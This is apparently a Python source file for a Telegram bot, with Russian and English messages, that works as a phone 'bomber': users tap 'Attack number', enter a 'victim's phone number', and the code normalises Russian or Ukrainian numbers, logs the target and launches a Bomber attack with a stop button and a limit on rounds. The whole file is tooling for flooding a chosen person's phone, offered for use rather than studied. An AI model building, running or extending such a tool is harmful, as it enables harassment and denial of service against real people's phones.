import re 
from datetime import datetime as dt

import globals
from sites import Bomber
from globals import dp, conn
from config import config

from sqlalchemy import select

from aiogram.types import Message
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

from db_models.User import session, DataUser

cfg = config.Config()

@dp.message_handler(lambda message: message.text == "💣Атаковать номер")
async def ru_attack_phone(message: Message):
    '''
    Функция, выводящую информацию при нажатии на кнопку "Атаковать"

    Основные данные:
        1. Дата и время
        2. Номер телефона
        3. Количество кругов

    Рускоязычные пользователи.
    '''

    user_data = session.query(DataUser).filter_by(user_id=message.from_user.id).first()

    if user_data == None:
        user_data = DataUser(
                user_id=message.from_user.id, date=dt.strftime(dt.now(), "%d-%m-%Y %H:%M:%S"), 
                status=30, last_phone="None", 
                last_date="None"
        )
        session.commit()

        await message.answer(
                f"📄Информация о последней атаке ➜\n\n"
                f"📌Вы еще не совершали атаку!\n\n"
                f"☎️Введите номер телефона жертвы(без +)⤵️", 
                )
    else:
        date  = dt.strptime(user_data.date, "%d-%m-%Y %H:%M:%S") if user_data.date != "None" else "Неизвестно" #Time
        date  = dt.strftime(date, "%d-%m-%Y %H:%M:%S") if date != "Неизвестно" else "Неизвестно"
        phone = f"<code>{user_data.last_phone}</code>" if user_data.last_phone != "None" else "<b>Неизвестно</b>"
        
        await message.answer(
                f"📄Информация о последней атаке ➜\n\n"
                f"🕰Время: <b>{date}</b>\n"
                f"📌Номер: {phone}\n"
                f"⏱Осталось кругов: <b>{user_data.status}</b>\n\n"
                f"☎️Введите номер телефона жертвы(без +)⤵️"
                )

@dp.message_handler(lambda message: message.text == "💣Attack number")
async def eng_attack_phone(message: Message):
    '''
    Функция, выводящую информацию при нажатии на кнопку "Атаковать"

    Основные данные:
        1. Дата и время
        2. Номер телефона
        3. Количество кругов

    Англоязычные пользователи.
    '''

    user_data = session.query(DataUser).filter_by(user_id=message.from_user.id).first()

    if user_data == None:
        user_data = DataUser(
                user_id=message.from_user.id, date=dt.strftime(dt.now(), "%d-%m-%Y %H:%M:%S"), 
                status=30, last_phone="None", 
                last_date="None"
        )
        session.commit()

        await message.answer(
                f"📄Information about the last attack ➜\n\n"
                f"📌You haven't made an attack yet!\n\n"
                f"☎️Enter the victim's phone number (no +)⤵️", 
                )
    else:
        date  = dt.strptime(user_data.date, "%d-%m-%Y %H:%M:%S") if user_data.date != "None" else "Unknown"
        date  = dt.strftime(date, "%d-%m-%Y %H:%M:%S") if date != "Unknown" else "Unknown"
        phone = f"<code>{user_data.last_phone}</code>" if user_data.last_phone != "None" else "<b>Unknown</b>"
        
        await message.answer(
                f"📄Information about the last attack ➜\n\n"
                f"🕰Time: <b>{date}</b>\n"
                f"📌Phone number: {phone}\n"
                f"⏱Circles left: <b>{user_data.status}</b>\n\n"
                f"☎️Enter the victim's phone number (no +)⤵️"
                )

@dp.message_handler(lambda message: not message.text.startswith((
        "/msg", "/help",
         "/usd", "/btc", 
         "/bnb", "/eth", 
         "/stat", "/mail", 
         "📲Купить виртуальный номер"))
         )
async def take_phone(message: Message):
    if not message.chat.id in cfg.super_groups:
        phone = re.sub("[^0-9]", "", message.text)

        if phone.startswith("7") or phone.startswith("8"):
            phone = f"7{phone[1:]}"
            globals.attack_country = "ru"

        elif phone.startswith("38") or phone.startswith("+38"):
            arr_phone = phone.split("0")[1]
            phone = f"38{arr_phone}"
            globals.attack_country = "uk"
            
        else:
            return await message.answer("🔁Не удалось определить страну. Проверьте номер на корректность!", reply=True)

        #Update data (last phone and last date)
        update_data = session.query(DataUser).filter_by(user_id=message.from_user.id).first()

        update_data.last_phone = phone
        update_data.last_date = dt.strftime(dt.now(), "%d-%m-%Y %H:%M:%S")

        session.commit()

        usl = InlineKeyboardMarkup(
                inline_keyboard = [
                        [InlineKeyboardButton(
                                text="⏹Остановить", callback_data=f"Остановить_{message.from_user.id}")]
                ])

        await message.answer(
                text="▶️Атака началась!\nНажмите кнопку для остановки атаки.", 
                reply_markup = usl
                )

        globals.start_attack = Bomber(user_id=str(message.from_user.id))
        await globals.start_attack.start(message.text, message.from_user.id)